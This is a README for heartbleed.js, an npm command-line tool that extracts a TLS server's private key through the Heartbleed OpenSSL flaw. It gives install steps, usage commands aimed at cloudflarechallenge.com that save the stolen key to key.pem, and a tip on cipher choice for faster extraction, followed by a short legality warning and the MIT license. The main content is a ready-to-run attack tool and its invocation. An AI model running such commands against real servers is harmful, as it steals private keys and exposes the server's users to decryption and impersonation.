# Heartbleed

Extracting server private key using [Heartbleed][0] OpenSSL vulnerability.

NOTE: Pointing this tool at other people's servers is illegal in most countries.

## How to use

```bash
$ npm install -g heartbleed.js
$ heartbleed
Options:
  --host         [required]
  --port         [default: 443]
  --concurrency  [default: 1]

Missing required arguments: host

$ heartbleed -h cloudflarechallenge.com -c 1000 >> key.pem
```

Protip, use cheap ciphers:

```bash
heartbleed -h cloudflarechallenge.com -c 1000 --ciphers="AES128-SHA" >> key.pem
```

#### LICENSE

This software is licensed under the MIT License.

Copyright Fedor Indutny, 2014.

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to permit
persons to whom the Software is furnished to do so, subject to the
following conditions:

The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
USE OR OTHER DEALINGS IN THE SOFTWARE.

[0]: http://heartbleed.com/
